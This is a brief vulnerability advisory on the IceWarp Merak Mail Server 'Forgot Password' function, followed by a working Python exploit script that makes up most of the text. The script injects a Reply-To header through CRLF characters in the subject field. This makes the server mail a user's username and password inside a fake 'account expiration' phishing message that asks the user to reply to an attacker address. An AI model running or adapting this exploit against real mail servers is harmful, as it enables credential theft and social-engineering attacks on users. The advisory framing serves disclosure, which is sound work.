source: http://www.securityfocus.com/bid/34827/info

IceWarp Merak Mail Server is prone to an input-validation vulnerability because it uses client-supplied data when performing a 'Forgot Password' function.

Attackers can exploit this issue via social-engineering techniques to obtain valid users' login credentials; other attacks may also be possible.

#! /usr/bin/env python
import urllib2, sys

conf = {
 "captcha_uid": "5989688782215156001239966846169",
 "captcha": "4SJZ Z4GY",
 "forgot": "user@example.com",
 "replyto": "attacker@example.com",
 "server": "http://www.example.com/webmail/server/webmail.php"
}

data = """
<iq type="set">
 <query xmlns="webmail:iq:auth">
   <forgot>%(forgot)s</forgot>
   <captcha uid="%(captcha_uid)s">%(captcha)s</captcha>
   <subject>
     <![CDATA[
       Account expiration %EMAIL%\r\nReply-To: %(replyto)s\n
     ]]>
   </subject>
   <message>
     Dear %FULLNAME%,

     your account

     Username: %USERNAME%
     Password: %PASSWORD%

     has expired. To renew the account, please reply to this email
     leaving the email body intact, so we know the account is still
     used.

     Kind regards,

     the IT department
   </message>
 </query>
</iq>
""" % conf

req = urllib2.Request(conf['server'])
req.add_data(data)
res = urllib2.urlopen(req)
print repr(res.read())